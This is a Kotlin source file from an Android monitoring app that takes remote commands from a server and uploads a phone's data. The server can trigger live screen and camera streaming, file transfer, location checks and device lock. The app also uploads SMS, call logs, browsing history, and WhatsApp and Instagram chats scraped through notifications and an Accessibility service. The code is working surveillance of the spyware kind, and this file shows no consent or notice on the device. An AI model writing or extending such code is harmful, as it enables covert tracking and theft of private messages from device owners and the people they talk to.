package com.spapp.monitoring.sync

import android.content.Context
import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
import com.spapp.monitoring.blocking.BlockRule
import com.spapp.monitoring.blocking.BlockRulesCache
import com.spapp.monitoring.collectors.AppUsageCollector
import com.spapp.monitoring.collectors.CallLogCollector
import com.spapp.monitoring.collectors.FileManagerCollector
import com.spapp.monitoring.collectors.InstalledAppsCollector
import com.spapp.monitoring.collectors.LocationFetcher
import com.spapp.monitoring.collectors.PermissionStatusCollector
import com.spapp.monitoring.collectors.SmsLogCollector
import com.spapp.monitoring.collectors.WebHistoryCollector
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import com.spapp.monitoring.filetransfer.FileTransferClient
import com.spapp.monitoring.geofence.GeofenceManager
import com.spapp.monitoring.network.AckCommandRequest
import com.spapp.monitoring.network.ApiClient
import com.spapp.monitoring.network.AppUsageEntryDto
import com.spapp.monitoring.network.AppUsageSyncRequest
import com.spapp.monitoring.network.CallLogEntryDto
import com.spapp.monitoring.network.CallLogSyncRequest
import com.spapp.monitoring.network.InstalledAppDto
import com.spapp.monitoring.network.InstalledAppsSyncRequest
import com.spapp.monitoring.network.LocationReportRequest
import com.spapp.monitoring.network.RemoteCommand
import com.spapp.monitoring.network.SmsLogEntryDto
import com.spapp.monitoring.network.SmsLogSyncRequest
import com.spapp.monitoring.network.WebHistoryEntryDto
import com.spapp.monitoring.network.WebHistorySyncRequest
import com.spapp.monitoring.data.local.InstagramMessageEntry
import com.spapp.monitoring.network.InstagramMessageEntryDto
import com.spapp.monitoring.network.InstagramMessagesSyncRequest
import com.spapp.monitoring.network.WhatsAppMessageEntryDto
import com.spapp.monitoring.network.WhatsAppMessagesSyncRequest
import java.time.Instant

/**
 * The actual sync pass: fetch feature flags, run enabled collectors, fetch and
 * process pending commands. Shared by [SyncWorker] (the periodic WorkManager
 * fallback, every few hours) and [SyncForegroundService] (the primary,
 * near-real-time loop) so there's exactly one implementation of "what a sync
 * cycle does" regardless of what triggers it.
 */
class SyncRunner(private val context: Context) {

    /**
     * Fast command pass: called directly by [SpappFirebaseMessagingService] on FCM push.
     * Skips heavy periodic collectors (installed apps, app usage, web history)
     * and processes pending commands (location_check, lock, file commands) immediately.
     */
    suspend fun runFastCommandPass(): Boolean {
        val state = DeviceState(context)
        val authToken = state.authToken ?: return false
        val bearer = "Bearer $authToken"

        val commands = try {
            ApiClient.service.getPendingCommands(bearer).body().orEmpty()
        } catch (e: Exception) {
            emptyList()
        }

        if (commands.isEmpty()) return true

        // Process screen and camera stream immediately
        commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
        commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
        commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
        commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }

        val flagsResponse = try {
            ApiClient.service.getFeatureFlags(bearer)
        } catch (e: Exception) {
            null
        }
        val flags = flagsResponse?.body()

        if (flags == null || flags.location_on_demand) {
            processLocationCommands(bearer, commands.filter { it.command_type == "location_check" })
        }
        if (flags == null || flags.remote_lock) {
            commands.filter { it.command_type == "lock" }.forEach { processLockCommand(bearer, it) }
        }
        if (flags?.file_manager == true) {
            commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
            commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
        }
        commands.filter { it.command_type == "sync_whatsapp" }.forEach { command ->
            try {
                com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
                com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
                    service.recordWhatsAppChatIfForeground(service.rootInActiveWindow)
                }
                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(context)
                ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = "WhatsApp sync triggered"))
            } catch (_: Exception) {}
        }
        commands.filter { it.command_type == "sync_instagram" }.forEach { command ->
            try {
                com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
                com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
                    service.recordInstagramChatIfForeground(service.rootInActiveWindow)
                }
                val currentAcc = state.instagramAccount
                if (!currentAcc.isNullOrBlank()) {
                    ApiClient.service.updateInstagramAccount(bearer, mapOf("accountName" to currentAcc))
                }
                syncInstagramMessages(bearer, AppDatabase.getInstance(context))
                ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = "Instagram sync triggered"))
            } catch (_: Exception) {}
        }
        com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
        com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
            service.recordWhatsAppChatIfForeground(service.rootInActiveWindow)
        }
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(context)


        state.lastSyncAtEpochMs = System.currentTimeMillis()
        return true
    }

    /** Returns true on a completed pass (even if individual sub-steps failed softly), false to retry later. */
    suspend fun runOnce(): Boolean {
        val state = DeviceState(context)
        val authToken = state.authToken ?: return false
        val bearer = "Bearer $authToken"

        val flagsResponse = try {
            ApiClient.service.getFeatureFlags(bearer)
        } catch (e: Exception) {
            return false
        }
        if (!flagsResponse.isSuccessful || flagsResponse.body() == null) {
            return false
        }
        val flags = flagsResponse.body()!!
        val db = AppDatabase.getInstance(context)

        // Always mirrored locally (not just when true) — BlockAccessibilityService
        // reads this flag directly to decide whether to record a URL it just
        // saw, and it needs to stop recording immediately once the admin
        // turns the flag off, the same way syncBlockRules() below always
        // overwrites the local rules cache regardless of app_blocking.
        state.webHistoryTrackingEnabled = flags.web_history_tracking

        // Always sent, regardless of which flags are on — this is "can this
        // feature actually work on this device right now", not "is it
        // turned on", so the dashboard can show a real OS-level permission
        // gap (e.g. Accessibility Service never enabled) even for a scope
        // the admin hasn't toggled on yet.
        try {
            ApiClient.service.syncPermissionStatus(bearer, PermissionStatusCollector(context).collect())
        } catch (e: Exception) {
            // Retried on next scheduled run.
        }

        // 1. Process pending commands FIRST so admin actions never wait for heavy telemetry uploads
        val commands = try {
            ApiClient.service.getPendingCommands(bearer).body().orEmpty()
        } catch (e: Exception) {
            emptyList()
        }

        if (flags.location_on_demand) {
            processLocationCommands(bearer, commands.filter { it.command_type == "location_check" })
        }
        if (flags.remote_lock) {
            commands.filter { it.command_type == "lock" }.forEach { processLockCommand(bearer, it) }
        }
        if (flags.file_manager) {
            commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
            commands.filter { it.command_type == "whatsapp_file_list" }.forEach { processWhatsAppFileListCommand(bearer, it) }
            commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
        }
        commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
        commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
        commands.filter { it.command_type == "whatsapp_sync_now" }.forEach { processWhatsAppSyncCommand(bearer, it) }
        commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
        commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }

        // 2. Heavy periodic background collectors run after commands complete
        if (flags.app_usage_tracking) {
            syncAppUsage(bearer, db)
        }
        if (flags.web_history_tracking) {
            syncWebHistory(bearer, db)
        }
        if (flags.sms_log) {
            syncSmsLog(bearer, db)
        }
        if (flags.call_log) {
            syncCallLog(bearer, db)
        }
        if (flags.installed_apps_list) {
            syncInstalledApps(bearer)
        }
        if (flags.geofencing) {
            syncGeofences(bearer)
        }
        syncBlockRules(bearer)
        syncWhatsAppMessages(bearer, db)
        syncInstagramMessages(bearer, db)

        state.lastSyncAtEpochMs = System.currentTimeMillis()
        return true
    }

    private suspend fun processLocationCommands(bearer: String, commands: List<RemoteCommand>) {
        if (commands.isEmpty()) return

        val fetcher = LocationFetcher(context)
        val location = fetcher.fetchCurrentLocation()

        if (location == null) {
            val reason = if (!fetcher.hasPermission()) {
                "Location permission not granted on device"
            } else {
                "Location unavailable (GPS/Location service disabled or no fix)"
            }
            android.util.Log.w("SyncRunner", "Location fetch failed: $reason")
            for (command in commands) {
                try {
                    ApiClient.service.ackCommand(
                        bearer,
                        command.id,
                        AckCommandRequest(success = false, message = reason)
                    )
                } catch (e: Exception) {
                    android.util.Log.e("SyncRunner", "Failed to ack failed location command", e)
                }
            }
            return
        }

        for (command in commands) {
            try {
                ApiClient.service.reportLocation(
                    bearer,
                    LocationReportRequest(
                        latitude = location.latitude,
                        longitude = location.longitude,
                        accuracyM = location.accuracy,
                        commandId = command.id,
                        source = "on_demand"
                    )
                )
            } catch (e: Exception) {
                android.util.Log.e("SyncRunner", "Failed to report location", e)
            }
        }
    }

    private suspend fun processLockCommand(bearer: String, command: RemoteCommand) {
        try {
            val locked = SpappDeviceAdminReceiver.lockNow(context)
            ApiClient.service.ackCommand(
                bearer,
                command.id,
                AckCommandRequest(
                    success = locked,
                    message = if (locked) "Device locked" else "Device Admin not active — user must enable it first"
                )
            )
        } catch (e: Exception) {
            // Retried next sync cycle.
        }
    }

    private suspend fun processFileListCommand(bearer: String, command: RemoteCommand) {
        try {
            val files = FileManagerCollector(context).listAllRecursive()
            ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, files = files))
        } catch (e: Exception) {
            // Retried next sync cycle.
        }
    }

    private suspend fun processWhatsAppFileListCommand(bearer: String, command: RemoteCommand) {
        try {
            val files = FileManagerCollector(context).listWhatsAppFiles()
            ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, files = files))
        } catch (e: Exception) {
            // Retried next sync cycle.
        }
    }

    private suspend fun processWhatsAppSyncCommand(bearer: String, command: RemoteCommand) {
        try {
            val db = AppDatabase.getInstance(context)
            syncWhatsAppMessages(bearer, db)
            ApiClient.service.ackCommand(
                bearer,
                command.id,
                AckCommandRequest(success = true, message = "WhatsApp contacts and messages synced")
            )
        } catch (e: Exception) {
            ApiClient.service.ackCommand(
                bearer,
                command.id,
                AckCommandRequest(success = false, message = e.message ?: "Failed to sync WhatsApp")
            )
        }
    }

    private suspend fun processGetWhatsAppChatCommand(bearer: String, command: RemoteCommand) {
        val chatName = (command.payload?.get("chatName") as? String)?.trim()
        val payloadPhone = (command.payload?.get("phoneNumber") as? String)?.trim()
            ?: (command.payload?.get("phone") as? String)?.trim()
        val days = (command.payload?.get("days") as? Number)?.toInt() ?: 2
        val cutoffMs = System.currentTimeMillis() - (days * 24 * 60 * 60 * 1000L)

        if (chatName.isNullOrBlank()) {
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(success = false, message = "Missing chatName parameter")
                )
            } catch (_: Exception) {}
            return
        }

        // Resolve contact phone number digits
        val rawDigits = if (!payloadPhone.isNullOrBlank() && payloadPhone.any { it.isDigit() }) {
            payloadPhone.filter { it.isDigit() }
        } else if (chatName.filter { it.isDigit() }.length >= 7) {
            chatName.filter { it.isDigit() }
        } else {
            try {
                com.spapp.monitoring.collectors.WhatsAppContactsCollector(context).findPhoneNumberForContact(chatName) ?: ""
            } catch (_: Exception) { "" }
        }
        val phoneDigits = if (rawDigits.length > 10) rawDigits.takeLast(10) else rawDigits

        try {
            val db = AppDatabase.getInstance(context)
            val gatheredEntries = mutableListOf<WhatsAppMessageEntry>()

            // 1. Extract messages for this chat from active notifications (including MessagingStyle message history)
            com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.let { listener ->
                val notifEntries = listener.extractMessagesForChat(chatName, cutoffMs, phoneDigits)
                gatheredEntries.addAll(notifEntries)
            }

            // 2. If WhatsApp is currently foreground, inspect accessibility window
            com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
                service.recordWhatsAppChatIfForeground(service.rootInActiveWindow)
            }

            // 3. Save any newly gathered entries into Room DB
            if (gatheredEntries.isNotEmpty()) {
                db.whatsAppMessageDao().insertAll(gatheredEntries)
            }

            // 4. Retrieve ALL conversation messages for this chat from Room DB for the last N days
            var chatMessages = if (phoneDigits.length >= 7) {
                db.whatsAppMessageDao().getMessagesForChatWithPhone(chatName, phoneDigits, cutoffMs)
            } else {
                db.whatsAppMessageDao().getMessagesForChat(chatName, cutoffMs)
            }
            if (chatMessages.isEmpty()) {
                // Fallback to all stored messages for this chat if last 2 days has none
                chatMessages = if (phoneDigits.length >= 7) {
                    db.whatsAppMessageDao().getMessagesForChatWithPhone(chatName, phoneDigits, cutoffMs = 0L)
                } else {
                    db.whatsAppMessageDao().getMessagesForChat(chatName, cutoffMs = 0L)
                }
            }

            // 5. Check for recently received WhatsApp images (within last 2 days)
            val latestMediaBase64 = try {
                FileManagerCollector(context).getLatestWhatsAppImageBase64(maxAgeMs = days * 24 * 60 * 60 * 1000L)
            } catch (_: Exception) { null }

            // 6. Map to DTOs (normalizing chatName so server stores under the requested chat name)
            val dtos = chatMessages.map {
                WhatsAppMessageEntryDto(
                    chatName = chatName,
                    sender = it.sender,
                    messageText = it.messageText,
                    isOutgoing = it.isOutgoing,
                    messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                    mediaType = it.mediaType ?: (if (it.mediaPath != null) "image" else null),
                    mediaPath = it.mediaPath ?: latestMediaBase64
                )
            }

            // 7. Upload conversation messages to server and purge other chats to keep server storage minimal
            val resp = ApiClient.service.syncWhatsAppMessages(
                bearer,
                WhatsAppMessagesSyncRequest(
                    entries = dtos,
                    activeChat = chatName,
                    clearOtherChats = false
                )
            )

            if (resp.isSuccessful && chatMessages.isNotEmpty()) {
                db.whatsAppMessageDao().markSynced(chatMessages.map { it.id })
            }

            // 8. Ack command with actual retrieved message count
            val ackMsg = if (dtos.isNotEmpty()) {
                "Retrieved ${dtos.size} messages for '$chatName' for the last $days days"
            } else {
                "No messages found for '$chatName' in the last $days days on this device"
            }

            ApiClient.service.ackCommand(
                bearer,
                command.id,
                AckCommandRequest(
                    success = dtos.isNotEmpty(),
                    message = ackMsg
                )
            )
        } catch (e: Exception) {
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(
                        success = false,
                        message = e.message ?: "Failed to get chat contents"
                    )
                )
            } catch (_: Exception) {}
        }
    }

    private suspend fun processGetInstagramChatCommand(bearer: String, command: RemoteCommand) {
        val chatName = (command.payload?.get("chatName") as? String)?.trim()
        val days = (command.payload?.get("days") as? Number)?.toInt() ?: 2
        val cutoffMs = System.currentTimeMillis() - (days * 24 * 60 * 60 * 1000L)

        if (chatName.isNullOrBlank()) {
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(success = false, message = "Missing chatName parameter")
                )
            } catch (_: Exception) {}
            return
        }

        try {
            val db = AppDatabase.getInstance(context)
            val gatheredEntries = mutableListOf<InstagramMessageEntry>()

            // 1. Extract messages for this chat from active notifications
            com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.let { listener ->
                val notifEntries = listener.extractMessagesForInstagramChat(chatName, cutoffMs)
                gatheredEntries.addAll(notifEntries)
            }

            // 2. If Instagram is currently foreground, inspect accessibility window
            com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
                service.recordInstagramChatIfForeground(service.rootInActiveWindow)
            }

            // 3. Save any newly gathered entries into Room DB
            if (gatheredEntries.isNotEmpty()) {
                db.instagramMessageDao().insertAll(gatheredEntries)
            }

            // 4. Retrieve conversation messages for this chat from Room DB
            var chatMessages = db.instagramMessageDao().getMessagesForChat(chatName, cutoffMs)
            if (chatMessages.isEmpty()) {
                chatMessages = db.instagramMessageDao().getMessagesForChat(chatName, cutoffMs = 0L)
            }

            // 5. Map to DTOs
            val dtos = chatMessages.map {
                InstagramMessageEntryDto(
                    chatName = chatName,
                    sender = it.sender,
                    messageText = it.messageText,
                    isOutgoing = it.isOutgoing,
                    messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                    mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
                    mediaPath = it.mediaPath,
                    reelUrl = it.reelUrl
                )
            }

            // 6. Upload conversation messages to server
            val resp = ApiClient.service.syncInstagramMessages(
                bearer,
                InstagramMessagesSyncRequest(
                    entries = dtos,
                    activeChat = chatName
                )
            )

            if (resp.isSuccessful && chatMessages.isNotEmpty()) {
                db.instagramMessageDao().markSynced(chatMessages.map { it.id })
            }

            val ackMsg = if (dtos.isNotEmpty()) {
                "Retrieved ${dtos.size} Instagram messages for '$chatName' for the last $days days"
            } else {
                "No messages found for '$chatName' in the last $days days on this device"
            }

            ApiClient.service.ackCommand(
                bearer,
                command.id,
                AckCommandRequest(
                    success = dtos.isNotEmpty(),
                    message = ackMsg
                )
            )
        } catch (e: Exception) {
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(
                        success = false,
                        message = e.message ?: "Failed to get Instagram chat contents"
                    )
                )
            } catch (_: Exception) {}
        }
    }

    private suspend fun processFileDownloadCommand(bearer: String, command: RemoteCommand) {
        try {
            val path = command.payload?.get("path") as? String
            val collector = FileManagerCollector(context)
            val file = path?.let { collector.resolveFile(it) }

            if (file == null) {
                ApiClient.service.ackCommand(
                    bearer, command.id,
                    AckCommandRequest(success = false, message = "File not found: $path")
                )
                return
            }

            val authToken = DeviceState(context).authToken ?: return
            val uploaded = FileTransferClient(authToken).uploadFile(command.id, file, null)

            ApiClient.service.ackCommand(
                bearer, command.id,
                AckCommandRequest(success = uploaded, message = if (uploaded) "Transferred" else "Transfer failed")
            )
        } catch (e: Exception) {
            // Retried next sync cycle.
        }
    }

    private suspend fun processScreenStreamCommand(bearer: String, command: RemoteCommand) {
        val action = (command.payload?.get("action") as? String) ?: "start"
        if (action == "stop") {
            com.spapp.monitoring.screenstream.ScreenStreamManager.stopStreaming()
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(success = true, message = "Screen stream stopped")
                )
            } catch (e: Exception) {
                android.util.Log.e("SyncRunner", "Failed to ack stop screen stream", e)
            }
            return
        }

        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(
                        success = false,
                        message = "Live screen stream requires Android 11+ (API 30+)"
                    )
                )
            } catch (e: Exception) {
                android.util.Log.e("SyncRunner", "Failed to ack screen stream API check", e)
            }
            return
        }

        if (com.spapp.monitoring.blocking.BlockAccessibilityService.instance == null) {
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(
                        success = false,
                        message = "Accessibility service is not active on this device. Please enable Accessibility for SPApp Monitoring in phone Settings."
                    )
                )
            } catch (e: Exception) {
                android.util.Log.e("SyncRunner", "Failed to ack screen stream accessibility check", e)
            }
            return
        }

        val state = DeviceState(context)
        val authToken = state.authToken
        val deviceId = state.getEffectiveDeviceId()

        if (authToken == null || deviceId == null) {
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(
                        success = false,
                        message = "Device state missing auth token or device ID"
                    )
                )
            } catch (e: Exception) {
                android.util.Log.e("SyncRunner", "Failed to ack screen stream auth check", e)
            }
            return
        }

        com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(context, authToken, deviceId)

        try {
            ApiClient.service.ackCommand(
                bearer,
                command.id,
                AckCommandRequest(
                    success = true,
                    message = "Screen stream started"
                )
            )
        } catch (e: Exception) {
            android.util.Log.e("SyncRunner", "Failed to ack screen stream start", e)
        }
    }

    private suspend fun processCameraStreamCommand(bearer: String, command: RemoteCommand) {
        val action = (command.payload?.get("action") as? String) ?: "start"
        val lens = (command.payload?.get("lens") as? String) ?: "back"

        if (action == "stop") {
            com.spapp.monitoring.camerastream.CameraStreamService.stop(context)
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(success = true, message = "Camera stream stopped")
                )
            } catch (e: Exception) {
                android.util.Log.e("SyncRunner", "Failed to ack stop camera stream", e)
            }
            return
        }

        val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.CAMERA
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        if (!hasCameraPermission) {
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(
                        success = false,
                        message = "Camera permission is not granted on this device. Please grant Camera permission in phone Settings."
                    )
                )
            } catch (e: Exception) {
                android.util.Log.e("SyncRunner", "Failed to ack camera stream permission check", e)
            }
            return
        }

        val state = DeviceState(context)
        val authToken = state.authToken
        val deviceId = state.getEffectiveDeviceId()

        if (authToken == null || deviceId == null) {
            try {
                ApiClient.service.ackCommand(
                    bearer,
                    command.id,
                    AckCommandRequest(
                        success = false,
                        message = "Device state missing auth token or device ID"
                    )
                )
            } catch (e: Exception) {
                android.util.Log.e("SyncRunner", "Failed to ack camera stream auth check", e)
            }
            return
        }

        com.spapp.monitoring.camerastream.CameraStreamService.start(context, lens)

        try {
            ApiClient.service.ackCommand(
                bearer,
                command.id,
                AckCommandRequest(
                    success = true,
                    message = "Camera stream started ($lens lens)"
                )
            )
        } catch (e: Exception) {
            android.util.Log.e("SyncRunner", "Failed to ack camera stream start", e)
        }
    }

    private suspend fun syncBlockRules(bearer: String) {
        val rulesResponse = try {
            ApiClient.service.getBlockRules(bearer)
        } catch (e: Exception) {
            return
        }
        val dtos = rulesResponse.body() ?: return

        val rules = dtos.map { dto ->
            BlockRule(
                id = dto.id,
                ruleType = dto.rule_type,
                target = dto.target,
                days = dto.schedule?.days,
                startTime = dto.schedule?.start,
                endTime = dto.schedule?.end
            )
        }
        BlockRulesCache(context).save(rules)
    }

    private suspend fun syncGeofences(bearer: String) {
        val geofencesResponse = try {
            ApiClient.service.getGeofences(bearer)
        } catch (e: Exception) {
            return
        }
        val geofences = geofencesResponse.body() ?: return
        GeofenceManager(context).syncGeofences(geofences)
    }

    private suspend fun syncAppUsage(bearer: String, db: AppDatabase) {
        val collector = AppUsageCollector(context)
        val fresh = collector.collectToday()
        if (fresh.isNotEmpty()) {
            db.appUsageDao().clearUnsyncedForDate(fresh.first().usageDate)
            db.appUsageDao().insertAll(fresh)
        }

        val unsynced = db.appUsageDao().getUnsynced()
        if (unsynced.isEmpty()) return

        val dtos = unsynced.map { AppUsageEntryDto(it.packageName, it.appName, it.usageSeconds, it.usageDate) }
        try {
            val response = ApiClient.service.syncAppUsage(bearer, AppUsageSyncRequest(dtos))
            if (response.isSuccessful) {
                db.appUsageDao().deleteByIds(unsynced.map { it.id })
            }
        } catch (e: Exception) {
            // Left un-deleted — retried on next scheduled run.
        }
    }

    private suspend fun syncSmsLog(bearer: String, db: AppDatabase) {
        val state = DeviceState(context)
        val collector = SmsLogCollector(context)
        val fresh = collector.collectSince(state.smsLastExternalId)
        if (fresh.isNotEmpty()) {
            db.smsLogDao().insertAll(fresh)
            state.smsLastExternalId = maxOf(state.smsLastExternalId, fresh.maxOf { it.externalId })
        }

        val unsynced = db.smsLogDao().getUnsynced()
        if (unsynced.isEmpty()) return

        val dtos = unsynced.map {
            SmsLogEntryDto(it.direction, it.counterparty, Instant.ofEpochMilli(it.messageAtEpochMs).toString(), it.body, it.contactName)
        }
        try {
            val response = ApiClient.service.syncSmsLog(bearer, SmsLogSyncRequest(dtos))
            if (response.isSuccessful) {
                db.smsLogDao().deleteByIds(unsynced.map { it.id })
            }
        } catch (e: Exception) {
            // Retried on next scheduled run.
        }
    }

    private suspend fun syncCallLog(bearer: String, db: AppDatabase) {
        val state = DeviceState(context)
        val collector = CallLogCollector(context)
        val fresh = collector.collectSince(state.callLastExternalId)
        if (fresh.isNotEmpty()) {
            db.callLogDao().insertAll(fresh)
            state.callLastExternalId = maxOf(state.callLastExternalId, fresh.maxOf { it.externalId })
        }

        val unsynced = db.callLogDao().getUnsynced()
        if (unsynced.isEmpty()) return

        val dtos = unsynced.map {
            CallLogEntryDto(it.direction, it.counterparty, it.durationSec, Instant.ofEpochMilli(it.calledAtEpochMs).toString(), it.contactName)
        }
        try {
            val response = ApiClient.service.syncCallLog(bearer, CallLogSyncRequest(dtos))
            if (response.isSuccessful) {
                db.callLogDao().deleteByIds(unsynced.map { it.id })
            }
        } catch (e: Exception) {
            // Retried on next scheduled run.
        }
    }

    /**
     * Two sources, merged: (1) the local Room buffer that
     * BlockAccessibilityService fills by reading supported browsers'
     * address bars — the real working mechanism, since modern Chrome
     * exposes no history API to third-party apps at all — and (2)
     * WebHistoryCollector's legacy content-provider query, kept as a
     * secondary source for the rare OEM/legacy browser that still
     * implements it. Buffered-and-deleted like SMS/call logs, not
     * fire-and-forget, since source (1) can produce real volume.
     */
    private suspend fun syncWebHistory(bearer: String, db: AppDatabase) {
        val unsynced = db.webHistoryDao().getUnsynced()
        val legacy = WebHistoryCollector(context).collectRecent()

        val dtos = unsynced.map {
            WebHistoryEntryDto(it.url, it.title, Instant.ofEpochMilli(it.visitedAtEpochMs).toString())
        } + legacy.map {
            WebHistoryEntryDto(it.url, it.title, Instant.ofEpochMilli(it.visitedAtEpochMs).toString())
        }
        if (dtos.isEmpty()) return

        try {
            val response = ApiClient.service.syncWebHistory(bearer, WebHistorySyncRequest(dtos))
            if (response.isSuccessful && unsynced.isNotEmpty()) {
                db.webHistoryDao().deleteByIds(unsynced.map { it.id })
            }
        } catch (e: Exception) {
            // Retried on next scheduled run.
        }
    }

    /** Installed apps are a snapshot, not an append-only log — always re-sent in full. */
    private suspend fun syncInstalledApps(bearer: String) {
        val collector = InstalledAppsCollector(context)
        val apps = collector.collect()
        if (apps.isEmpty()) return

        val dtos = apps.map {
            InstalledAppDto(
                it.packageName,
                it.appName,
                it.installDateEpochMs?.let { ms -> Instant.ofEpochMilli(ms).toString() },
                it.iconBase64
            )
        }
        try {
            ApiClient.service.syncInstalledApps(bearer, InstalledAppsSyncRequest(dtos))
        } catch (e: Exception) {
            // Retried on next scheduled run.
        }
    }

    private suspend fun syncWhatsAppMessages(bearer: String, db: AppDatabase) {
        try {
            val contacts = com.spapp.monitoring.collectors.WhatsAppContactsCollector(context).collectAllWhatsAppContacts()
            if (contacts.isNotEmpty()) {
                db.whatsAppMessageDao().insertAll(contacts)
            }
        } catch (_: Exception) {}

        val unsynced = db.whatsAppMessageDao().getUnsynced()
        if (unsynced.isEmpty()) return

        val dtos = unsynced.map {
            WhatsAppMessageEntryDto(
                chatName = it.chatName,
                sender = it.sender,
                messageText = it.messageText,
                isOutgoing = it.isOutgoing,
                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                mediaType = it.mediaType,
                mediaPath = it.mediaPath
            )
        }
        try {
            val response = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
            if (response.isSuccessful) {
                db.whatsAppMessageDao().markSynced(unsynced.map { it.id })
                db.whatsAppMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
            }
        } catch (e: Exception) {
            // Retried on next scheduled run.
        }
    }

    private suspend fun syncInstagramMessages(bearer: String, db: AppDatabase) {
        val unsynced = db.instagramMessageDao().getUnsynced()
        if (unsynced.isEmpty()) return

        val dtos = unsynced.map {
            InstagramMessageEntryDto(
                chatName = it.chatName,
                sender = it.sender,
                messageText = it.messageText,
                isOutgoing = it.isOutgoing,
                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                mediaType = it.mediaType,
                mediaPath = it.mediaPath,
                reelUrl = it.reelUrl
            )
        }
        try {
            val response = ApiClient.service.syncInstagramMessages(bearer, InstagramMessagesSyncRequest(dtos))
            if (response.isSuccessful) {
                db.instagramMessageDao().markSynced(unsynced.map { it.id })
                db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
            }
        } catch (e: Exception) {
            // Retried on next scheduled run.
        }
    }
}
